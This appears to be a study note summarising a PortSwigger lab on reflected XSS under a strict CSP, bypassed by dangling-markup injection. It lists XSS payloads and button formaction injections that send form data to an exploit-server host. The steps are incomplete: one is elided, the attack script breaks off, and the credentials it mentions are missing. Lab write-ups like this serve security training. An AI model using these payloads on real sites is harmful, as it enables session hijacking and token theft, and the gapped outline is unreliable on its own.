# Lab: Reflected XSS protected by very strict CSP, with dangling markup attack

**Official lab:** [https://portswigger.net/web-security/cross-site-scripting/content-security-policy/lab-very-strict-csp-with-dangling-markup-attack](https://portswigger.net/web-security/cross-site-scripting/content-security-policy/lab-very-strict-csp-with-dangling-markup-attack)

## Lab idea

The lab explores a very restrictive CSP and a dangling-markup scenario where full script execution is constrained. It practices recognizing how markup injection may expose sensitive page data even when ordinary script-based approaches are blocked.

## Vulnerability in brief
Cross-site scripting (XSS) is a web security vulnerability in which an application causes attacker-controlled content to be interpreted as executable script in a user’s browser. The code runs in the vulnerable site’s origin, so it can interfere with the victim’s interaction with that application and may access data or perform actions available to that user.

## Solution idea
1. Log in to the lab using the credentials provided above.
2. Interact with the change email function.
3. Use the browser DevTools to inspect the email input element.
4. Change the payload to foo@example.com"><img src= onerror=alert(1)> , embedding it within a valid email format.
- …
6. Return to the exploit server and enter the following attack script into the Body field: <body> <script> // Define the URLs for the lab environment and the exploit server.
7. Replace the academyFrontend and exploitServer URLs with the URLs of your lab environment and exploit server respectively.
8. Click Store , then Deliver exploit to victim .

## Payloads / key values
- `<img src onerror=alert(1)>`
- `email input`
- `email`
- `text`
- `foo@example.com"><img src= onerror=alert(1)>`
- `https://YOUR-LAB-ID.web-security-academy.net/my-account?email=<img src onerror=alert(1)>`
- `form-action`
- `/exploit`
- `https://exploit-YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit`
- `https://YOUR-LAB-ID.web-security-academy.net/my-account?email=foo@bar"><button formaction="https://exploit-YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit">Click me</button>`
- `formaction`
- `POST`
- `GET`
- `formmethod="get"`
- `https://YOUR-LAB-ID.web-security-academy.net/my-account?email=foo@bar"><button formaction="https://exploit-YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit" formmethod="get">Click me</button>`
- `academyFrontend`
- `exploitServer`
- `hacker@evil-user.net`

## Official source
- [PortSwigger Academy: Lab: Reflected XSS protected by very strict CSP, with dangling markup attack](https://portswigger.net/web-security/cross-site-scripting/content-security-policy/lab-very-strict-csp-with-dangling-markup-attack)
